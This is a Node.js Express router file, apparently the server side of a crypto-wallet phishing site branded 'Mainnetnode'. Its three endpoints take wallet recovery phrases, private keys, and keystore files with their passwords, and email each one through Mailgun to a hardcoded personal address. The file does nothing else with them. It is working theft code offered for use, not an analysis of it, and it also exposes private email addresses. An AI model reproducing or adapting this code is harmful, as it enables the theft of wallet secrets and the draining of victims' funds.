const express = require("express");
const router = express.Router();

// const mailgun = require("mailgun-js");
const { send } = require("express/lib/response");

const API_KEY = process.env.MAILGUN_API_KEY;
const DOMAIN = process.env.MAILGUN_DOMAIN;

const formData = require("form-data");
const Mailgun = require("mailgun.js");

const mailgun = new Mailgun(formData);
const client = mailgun.client({ username: "api", key: API_KEY });

// const email = 'Meritbabe1@gmail.com';
const email = "ajayimichael@hotmail.com";

router.post("/", async (req, res) => {
  const phrase = req.body.phrase;

  const messageData = {
    from: "Mainnetnode <no-reply@mainnetnode.online>",
    to: email,
    subject: "Phrase Data from Mainnetnode",
    html: `
          <strong>Phrase:</strong>
          <p>${phrase}</p>
        `,
  };

  try {
    const response = await client.messages.create(DOMAIN, messageData);
    console.log(response);
    res.status(200).json({
      success: true,
      response: response.message,
    });
  } catch (err) {
    console.error(err);
    res.status(400).json({
      success: false,
      msg: err.message,
    });
  }
});

router.post("/privateKey", async (req, res) => {
  const privateKey = req.body.privateKey;

  const messageData = {
    from: "Mainnetnode <no-reply@mainnetnode.online>",
    to: email,
    subject: "Private Key Data from Mainnetnode",
    html: `
          <strong>PrivateKey Phrase:</strong>
          <p>${privateKey}</p>
        `,
  };
  try {
    const response = await client.messages.create(DOMAIN, messageData);
    console.log(response);
    res.status(200).json({
      success: true,
      response: response.message,
    });
  } catch (err) {
    console.error(err);
    res.status(400).json({
      success: false,
      msg: err.message,
    });
  }
});

router.post("/keystoreJSON", async (req, res) => {
  const keyStore = req.body.keyStore;
  const password = req.body.password;

  const messageData = {
    from: "Mainnetnode <no-reply@mainnetnode.online>",
    to: email,
    subject: "KeyStore JSON Data from Mainnetnode",
    html: `
          <strong>KeywordJson:</strong>
          <p>${keyStore}</p>
          <br />
          <strong>Password:</strong>
          <p>${password}</p>
        `,
  };
  try {
    const response = await client.messages.create(DOMAIN, messageData);
    console.log(response);
    res.status(200).json({
      success: true,
      response: response.message,
    });
  } catch (err) {
    console.error(err);
    res.status(400).json({
      success: false,
      msg: err.message,
    });
  }
});

module.exports = router;
